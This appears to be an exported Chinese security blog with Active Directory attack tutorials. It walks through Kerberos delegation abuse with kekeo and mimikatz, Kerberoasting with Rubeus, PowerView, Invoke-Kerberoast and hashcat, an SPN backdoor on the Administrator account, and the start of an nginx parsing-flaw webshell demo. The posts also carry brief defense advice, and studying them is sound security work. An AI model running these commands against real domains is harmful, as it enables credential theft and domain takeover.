<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200211172239-0c56c080-4cb0-1.png" alt="img"></p>
<h6 id="PowerView-1"><a href="#PowerView-1" class="headerlink" title="PowerView"></a>PowerView</h6><p><strong>注</strong>：Powerview有两个版本，一个在dev分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">地址</a>，一个在master分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">地址</a></p>
<p>查找域中配置约束委派用户</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span>-DomainUser –TrustedToAuth -domain qiyou.com -<span class="keyword">Properties</span> distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200206170357-9bafde5a-48bf-1.png" alt="img"></p>
<p>查找域中配置约束委派的主机：</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span>-DomainComputer -TrustedToAuth -Domain qiyou.com -<span class="keyword">Properties</span> distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200205223329-7a841d9a-4824-1.png" alt="img"></p>
<h4 id="基于委派的攻击方法"><a href="#基于委派的攻击方法" class="headerlink" title="基于委派的攻击方法"></a>基于委派的攻击方法</h4><h5 id="1-已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限"><a href="#1-已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限" class="headerlink" title="1.已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限"></a>1.已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限</h5><p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505112605.png-water_print" alt="img"></p>
<p>现在已知域内服务账号 <code>sqlsvc</code> 的口令明文，则可使用 keke 工具构造 sqlsvc 服务账号的票据。</p>
<p>cmd</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">tgt::<span class="title">ask</span> /<span class="title">user:sqlsvc</span> /<span class="title">domain:testlab</span>.<span class="title">com</span> /<span class="title">passw</span> <span class="title">ord</span>:1<span class="title">qaz</span>@<span class="title">WSX3edc</span> /<span class="title">ticket:sqlsvc</span>.<span class="title">kirbi</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505112611.png-water_print" alt="img"></p>
<p>由于 <code>sqlsvc</code> 被设置为非约束性委派，因此可以利用刚才伪造的 sqlsvc 票据，向域服务器发起申请访问域服务器 <code>CIFS</code> 服务的管理员权限的 TGS 的命令</p>
<p>cmd</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">Tgs::<span class="title">s4u</span> /<span class="title">tgt:service_account_tgt_file</span> /<span class="title">user:administrator</span>@<span class="title">testlab.com</span> /<span class="title">service:service_to_access</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505113020.png-water_print" alt="img"></p>
<p>此时内存中已经有了访问域服务器 CIFS 服务的域管理员的 TGS 票据，需要将该票据注入当前的会话中，使用 mimikatz 的 <code>kerberos::ptt</code> 命令可完成票据的注入。注入票据后，当前的会话具备了访问域服务器 C 盘目录的权限</p>
<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505113149.png-water_print" alt="img"></p>
<h5 id="2-已控制非约束性委派服务账号所在的服务器"><a href="#2-已控制非约束性委派服务账号所在的服务器" class="headerlink" title="2.已控制非约束性委派服务账号所在的服务器"></a>2.已控制非约束性委派服务账号所在的服务器</h5><p>攻击者控制了服务器，与样例 1 类似。由于攻击者控制了服务器，可直接利用 <code>mimikatz</code> 从内存获取服务账号的 <code>TGT</code>，所以可以省去 <code>tgt::ask</code> 步骤，直接从 <code>tgs:s4u</code> 步骤开始，后续和样例 1 相同</p>
<h5 id="3-已获取配置了约束性委派的服务账号的口令-NTLM"><a href="#3-已获取配置了约束性委派的服务账号的口令-NTLM" class="headerlink" title="3.已获取配置了约束性委派的服务账号的口令 NTLM"></a>3.已获取配置了约束性委派的服务账号的口令 NTLM</h5><p>和样例 1 相同，样例 1 用明文口令生成 NTLM，然后向域服务器申请获取服务账号的 TGT。Kekeo 提供了该功能 ，可直接从 NTLM 开始，向域服务器申请 TGT。</p>
<h5 id="4-一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM"><a href="#4-一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM" class="headerlink" title="4.一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM"></a>4.一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM</h5><p>方法和样例 1 也是类似，只不过样例 1 中是服务账号，而本样例中是主机账号。测试结果截图分别如下，不再过多解释。测试可在任何域内主机中进行，不需要在主机账号所在的主机。</p>
<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505113609.png-water_print" alt="img"></p>
<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505113722.png-water_print" alt="img"></p>
<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505113740.png-water_print" alt="img"></p>
<h4 id="委派攻击的防御"><a href="#委派攻击的防御" class="headerlink" title="委派攻击的防御"></a>委派攻击的防御</h4><p>通过上文中说到设置了非约束委派的账户权限如果被窃取那么攻击者可能获取非常多其他账户的TGT，所以最好是不要在域中使用非约束委派这种功能。</p>
<p>域中不需要使用委派的账户特别是administrator账户，设置为“敏感用户不能被委派”。</p>
]]></content>
      <categories>
        <category>内网与域渗透学习</category>
      </categories>
  </entry>
  <entry>
    <title>java审计垃圾洞系列集合</title>
    <url>/2021/03/29/java-shen-ji-la-ji-dong-xi-lie-ji-he/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="1544ca04b9a7303b649cf7632ccef472930b99047a91fe7d15e2d94dd48363d6"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>java代码审计学习</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>kerberosating攻击学习</title>
    <url>/2020/08/05/kerberosating-gong-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="kerberosating攻击学习"><a href="#kerberosating攻击学习" class="headerlink" title="kerberosating攻击学习"></a>kerberosating攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin同时发布了 配套的攻击工具kerberoast。此后，不少研究人员对Ker beroasting进行了改进和扩展，在GitHub上开发发布了 大量工具，使得Kerberoasting逐渐发展成为域攻击的常用方法之一。</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="kerberos协议认证"><a href="#kerberos协议认证" class="headerlink" title="kerberos协议认证"></a>kerberos协议认证</h4><p>可以参考前面关于票据部分的讲解。</p>
<p>kerberos协议的认证授权过程，3次涉及使用<strong>不同账户的NTLM</strong>作为密钥加密数据。</p>
<ul>
<li>使用<strong>域用户</strong>的NTLM加密认证请求票据</li>
<li>KDC使用<strong>Krbtgt账号</strong>的NTLM加密认证后的票据TGT</li>
<li>KDC使用<strong>运行服务的服务账号</strong>的NTLM加密授权票据TGS</li>
</ul>
<p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200805123917.png" alt></p>
<p>​            当发布Windows 2000和Active Directory时，微软打算在 Windows NT 和Windows 95 上也支持Active Directory，这意味着不仅会产生各种各样的安全问题也会导致更多不安全的配置方式。同时，也意味着，微软要保证在多个不同版本的 Windows 客户端上均支持Kerberos协议。</p>
<p>​            要实现这个想法的一个简单的办法就是在Kerberos协议中使用<strong>RC4加密算法</strong>·，并将<strong>NTLM密码哈希</strong>作为该加密算法的私钥，该私钥可用于加密或签名Kerberos票证。因此，对于攻击者来说，一旦发现了 NTLM 密码哈希，就可以随意使用，包括重新拿回Active Directory域权限（比如：黄金票证和白银票证攻击）。</p>
<h4 id="SPN（ServicePrincipal-Names-服务主体名称"><a href="#SPN（ServicePrincipal-Names-服务主体名称" class="headerlink" title="SPN（ServicePrincipal Names)服务主体名称"></a>SPN（ServicePrincipal Names)服务主体名称</h4><p>官方文档：</p>
<p><a href="https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</a></p>
<p>全称<code>Service Principal Names</code></p>
<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN。</p>
<p>SPN分为两种，一种注册在<strong>AD上机器帐户(Computers)</strong>下，另一种注册在<strong>域用户帐户(Users)</strong>下</p>
<p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p>
<p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
<p><strong>SPN的格式</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">serviceclass<span class="regexp">/host:port/</span>servicename</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li>
<li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li>
<li>如果服务运行在默认端口上，则端口号(port)可以省略</li>
</ul>
<p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200805125050.png" alt></p>
<p><strong>查询SPN</strong></p>
<p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测。</p>
<h6 id="1-使用SetSPN"><a href="#1-使用SetSPN" class="headerlink" title="(1) 使用SetSPN"></a>(1) 使用SetSPN</h6><p>Win7和Windows Server2008自带的工具</p>
<p>查看当前域内的所有SPN：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>查看test域内的所有SPN：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -T test -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<h4 id="简述Kerberosating攻击"><a href="#简述Kerberosating攻击" class="headerlink" title="简述Kerberosating攻击"></a>简述Kerberosating攻击</h4><p>Kerberos使用公开的对称加密算法</p>
<figure class="highlight gml"><table><tr><td class="code"><pre><span class="line"><span class="symbol">y</span> = f (<span class="symbol">x</span>,key)</span><br></pre></td></tr></table></figure>

<ul>
<li>F为已知的对称加密算法 ，如<strong>RC4-HMAC</strong></li>
<li>x为待加密的数据，包含时间戳，其他为固定格式的内容, </li>
<li>key为加密密钥，即NTLM</li>
<li>y为加密后的数据</li>
</ul>
<p>如果能从Kerberos域网络中获取y,则根据已知算法f，使用不同的f可推算出不同的x。 由于x中包含简单易辨的时间戳，所以通过时间戳可快速判定数据解密是否正确，从而判定使用的是否为要寻找的口令.</p>
<h5 id="选择SPN服务账号的原因"><a href="#选择SPN服务账号的原因" class="headerlink" title="选择SPN服务账号的原因"></a>选择SPN服务账号的原因</h5><p>在域内主要有<strong>主机账号</strong>、<strong>用户账号</strong>、<strong>服务账号</strong>等3种主要账号类型 </p>
<ul>
<li>主机账号的口令由系统随机设置，几乎不能破解，而且每30天自动变更一次用户账号的口令复杂度由策略而定，在复杂度要求较高的域内，破解难度较大。</li>
<li>服务账号的口令存在很大的特殊性，口令在应用软件安装时往往自动设定，复杂度往往较为简单口令几乎不会更改，因为大部分应用软件没有提供修改服务账号的功能和接口，例如运行MS SQL Server 服务的sqlsvc账号等</li>
<li>SPN存在于账号的属性中，因此可以通过查询所有账号的属性，遍历域内所有SPN服务。因为主机账号的口 令几乎不能破解，所以只查询用户账号的SPN。</li>
</ul>
<h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><ul>
<li><p>查询SPN，找到有价值的SPN</p>
<ul>
<li>该SPN注册在域用户帐户(Users)下</li>
<li>域用户账户的权限很高</li>
</ul>
</li>
<li><p>请求服务票据(tgs)</p>
</li>
<li><p>导出服务票据(tgs)</p>
</li>
<li><p>重写服务票据&amp;RAM注入</p>
</li>
</ul>
<h5 id="实现Kerberoasting攻击的前提"><a href="#实现Kerberoasting攻击的前提" class="headerlink" title="实现Kerberoasting攻击的前提"></a>实现Kerberoasting攻击的前提</h5><ul>
<li>对于kerberos协议认证过程中返回的tgs_reply，在已知加密算法的前提下，我们可以尝试穷举口令。(<strong>服务密码一般默认为弱密码</strong>)</li>
<li>Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</li>
<li>域内的主机都能查询SPN。</li>
<li>域内的任何用户都可以向域内的任何服务请求TGS。</li>
</ul>
<h4 id="Kerberoasting攻击的利用"><a href="#Kerberoasting攻击的利用" class="headerlink" title="Kerberoasting攻击的利用"></a>Kerberoasting攻击的利用</h4><h5 id="使用-Rubeus工具"><a href="#使用-Rubeus工具" class="headerlink" title="使用 Rubeus工具"></a>使用 Rubeus工具</h5><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
<p>这是一个专门针对Kerberos的工具包，这个编译好像比较费事。。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure>

<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">C:\Rubeus&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"> ______        _</span><br><span class="line">(_____ \      |<span class="string"> </span>|</span><br><span class="line"> _____) )_   _|<span class="string"> </span>|<span class="string">__  _____ _   _  ___</span></span><br><span class="line">|<span class="string">  __  /</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \</span>|<span class="string"> ___ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/___)</span></span><br><span class="line">|<span class="string"> </span>|<span class="string">  \ \</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_) ) ____</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">___ </span>|</span><br><span class="line">|<span class="string">_</span>|<span class="string">   </span>|<span class="string">_</span>|<span class="string">____/</span>|<span class="string">____/</span>|<span class="string">_____)____/(___/</span></span><br><span class="line"></span><br><span class="line"><span class="string">v1.5.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] Action: Kerberoasting</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : zeo</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=harmj0y,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : asdf/asdfasdf</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$zeolab.local$asdf/asdfasdf*$AE5F019D4CDED6CD74830CC......</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : sqlservice</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=SQL,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : MSSQLSvc/SQL.zeolab.local</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.zeolab.local*$E2B3869290......</span></span><br></pre></td></tr></table></figure>

<p>将哈希保存为hash.txt文件，放到hashcat的目录下。使用命令</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p>离线破解服务票据</p>
<h5 id="1、获得有价值的SPN"><a href="#1、获得有价值的SPN" class="headerlink" title="1、获得有价值的SPN"></a>1、获得有价值的SPN</h5><p>需要满足以下条件：</p>
<ul>
<li>该SPN注册在域用户帐户(Users)下</li>
<li>域用户账户的权限很高</li>
</ul>
<p>可以选择以下三种方法：</p>
<h5 id="1-使用powershell模块Active-Directory"><a href="#1-使用powershell模块Active-Directory" class="headerlink" title="(1)使用powershell模块Active Directory"></a>(1)使用powershell模块Active Directory</h5><p><strong>注：</strong>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">import-module </span><span class="string">ActiveDirectory</span></span><br><span class="line"><span class="string">get-</span><span class="string">aduser </span>-<span class="string">filter </span>&#123;<span class="string">AdminCount </span>-<span class="string">eq </span>1 -<span class="string">and </span>(<span class="string">servicePrincipalName </span>-<span class="string">ne </span>0)&#125; -<span class="string">prop </span>* |<span class="string">select </span><span class="string">name,</span><span class="string">whencreated,</span><span class="string">pwdlastset,</span><span class="string">lastlogon</span></span><br></pre></td></tr></table></figure>

<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">import-<span class="keyword">module</span> .\<span class="module-access"><span class="module"><span class="identifier">Microsoft</span>.</span><span class="module"><span class="identifier">ActiveDirectory</span>.</span><span class="module"><span class="identifier">Management</span>.</span></span>dll</span><br></pre></td></tr></table></figure>

<p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>
<p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
<h4 id="2-使用PowerView"><a href="#2-使用PowerView" class="headerlink" title="(2)使用PowerView"></a>(2)使用PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<h4 id="3-使用kerberoast"><a href="#3-使用kerberoast" class="headerlink" title="(3)使用kerberoast"></a>(3)使用kerberoast</h4><p>powershell:</p>
<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
<p>vbs:</p>
<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
<p>参数如下：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">cscript <span class="module-access"><span class="module"><span class="identifier">GetUserSPNs</span>.</span></span>vbs</span><br></pre></td></tr></table></figure>

<h3 id="2、请求TGS"><a href="#2、请求TGS" class="headerlink" title="2、请求TGS"></a>2、请求TGS</h3><h4 id="1-请求指定TGS"><a href="#1-请求指定TGS" class="headerlink" title="(1)请求指定TGS"></a>(1)请求指定TGS</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="variable">$SPNName</span> = <span class="string">'MSSQLSvc/DC1.test.com'</span></span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System<span class="selector-class">.IdentityModel</span><span class="selector-class">.Tokens</span><span class="selector-class">.KerberosRequestorSecurityToken</span> -ArgumentList <span class="variable">$SPNName</span></span><br></pre></td></tr></table></figure>

<h4 id="2-请求所有TGS"><a href="#2-请求所有TGS" class="headerlink" title="(2)请求所有TGS"></a>(2)请求所有TGS</h4><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Add</span>-<span class="keyword">Type</span> -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | <span class="type">Select</span>-String '^CN' -<span class="keyword">Context</span> <span class="number">0</span>,<span class="number">1</span> | <span class="type">% &#123; New</span>-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $<span class="keyword">_</span>.<span class="keyword">Context</span>.PostContext[<span class="number">0</span>].Trim() &#125;</span><br></pre></td></tr></table></figure>

<p>执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS</p>
<h3 id="3、导出"><a href="#3、导出" class="headerlink" title="3、导出"></a>3、导出</h3><p>使用mimikatz</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">kerberos::<span class="built_in">list</span> /<span class="keyword">export</span></span><br></pre></td></tr></table></figure>

<h3 id="4、破解"><a href="#4、破解" class="headerlink" title="4、破解"></a>4、破解</h3><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">./tgsrepcrack<span class="selector-class">.py</span> wordlist<span class="selector-class">.txt</span> test.kirbi</span><br></pre></td></tr></table></figure>

<h2 id="0x05-Kerberoasting的实现方法二"><a href="#0x05-Kerberoasting的实现方法二" class="headerlink" title="0x05 Kerberoasting的实现方法二"></a>0x05 Kerberoasting的实现方法二</h2><hr>
<p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>
<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
<p>代码地址：</p>
<p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p>
<p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p>
<p>实例演示：</p>
<p>在域内一台主机上以普通用户权限执行：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat <span class="string">| fl</span></span><br></pre></td></tr></table></figure>

<p>-AdminCount表示选择高权限的用户</p>
<p>输出结果如下图</p>
<p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/2-2.png" alt="Alt text"></p>
<p>只提取出hash的参数如下：</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | <span class="type">Select</span> hash | <span class="type">ConvertTo</span>-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>

<p>输出结果如下图</p>
<p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/2-3.png" alt="Alt text"></p>
<p>使用hashcat破解的参数如下：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 <span class="string">/tmp/hash.txt</span> <span class="string">/tmp/password.list</span> -o found.txt <span class="params">--force</span></span><br></pre></td></tr></table></figure>

<p>破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p>
<p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/2-4.png" alt="Alt text"></p>
<p><strong>注：</strong></p>
<p>Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：</p>
<p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
<p>参数如下：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure>

<h2 id="0x06-Kerberoasting的后门利用"><a href="#0x06-Kerberoasting的后门利用" class="headerlink" title="0x06 Kerberoasting的后门利用"></a>0x06 Kerberoasting的后门利用</h2><hr>
<p>在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>
<p>例如为域用户<code>Administrator</code>添加<code>SPNVNC/DC1.test.com</code>，参数如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -U -A VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure>

<p>如下图</p>
<p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/3-1.png" alt="Alt text"></p>
<p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图</p>
<p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/3-2.png" alt="Alt text"></p>
<p>再使用hashcat破解即可</p>
<p><strong>补充：</strong></p>
<p>删除SPN的参数如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -D VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure>

<h2 id="0x07-防御"><a href="#0x07-防御" class="headerlink" title="0x07 防御"></a>0x07 防御</h2><hr>
<p>Kerberoasting攻击的主要前提是口令复杂度较低、 加密算法强度较弱</p>
<p>对抗Kerberoasting攻击也需从这2方面开展:</p>
<ul>
<li>提高服务账号的口令复杂度；</li>
<li>尽量将域内的服务器系统升级至少至Windows 2008 系统，应用AES256高难度的加密算法.</li>
</ul>
<p>管理员可在域内一台主机上使用Invoke-Kerberoast检查是否存在危险的SPN</p>
<p>下载地址：</p>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<p>参数：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网与域渗透学习</category>
      </categories>
  </entry>
  <entry>
    <title>nginx中间件漏洞</title>
    <url>/2020/04/03/nginx-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="Nginx-系列漏洞复现"><a href="#Nginx-系列漏洞复现" class="headerlink" title="Nginx -系列漏洞复现"></a><strong>Nginx -系列漏洞复现</strong></h2><p>IIS是微软开发的web服务器，需要收费，主要用来跑asp.net asp php，只能在windows下运行。</p>
<p>Apache是Apache基金会的web服务器，免费，只支持静态界面，是html容器，应用范围广泛。</p>
<p>Tomcat是Apache基金会的java服务器，主要用来跑jsp php python等</p>
<p>Ngnix是反向代理服务器，它是代理，本身并不执行，是个传话筒，把用户提交的请求转发给web服务器，再把web服务器的结果转发给用户。为了提高性能，启用反向代理，实际的web服务器可以有很多台，而Ngnix放在前面，可以把这些web服务器整合成一个虚拟的更强大的服务</p>
<h4 id="Nginx-文件解析漏洞"><a href="#Nginx-文件解析漏洞" class="headerlink" title="Nginx-文件解析漏洞"></a>Nginx-文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​          nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也可以非常好的支持PHP的运行。80sec发现其中存在一个较为严重的安全问题，默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析，这将导致严重的安全问题，使得恶意的攻击者可能攻陷支持php的nginx服务器。<br>​          漏洞格式：test.jpg/a.php</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy切换版本为nginx-5.2.17</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131115008.png" alt></p>
<p>我们可以从phpstudy下的nginx的index.html复制到网站根目录下</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131115049.png" alt></p>
<p>我们从本地打开网站的该页面即可看到nginx的欢迎页面</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131115112.png" alt></p>
<p>我们在C盘根目录下新建shell.php写入如下代码。然后任意选择一张图片。</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131115532.png" alt></p>
<p>我们在命令行下选择使用管理员打开命令行，然后使用copy命令制作图片马。</p>
